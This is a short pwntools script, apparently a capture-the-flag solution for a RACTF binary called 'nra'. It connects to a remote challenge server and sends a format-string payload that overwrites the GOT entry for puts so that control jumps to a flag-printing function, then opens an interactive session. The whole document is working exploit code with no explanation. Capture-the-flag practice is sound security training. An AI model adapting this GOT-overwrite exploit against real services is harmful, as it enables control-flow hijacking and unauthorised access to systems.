from pwn import *
context(os='linux',arch='i386',log_level='debug')

flaggy=0x08049245
#p = process('./nra')
p=remote('95.216.233.106',24694)
elf=ELF('./nra')
putsgot=elf.symbols['puts']
putsgot=0x0804C018
printfgot=0x0804C00C
systemgot=0x0804C01C
systemplt=0x08049070

payload = fmtstr_payload(4, {putsgot: flaggy})

p.recvuntil('How are you finding RACTF?\n')
p.sendline(payload)
p.interactive()

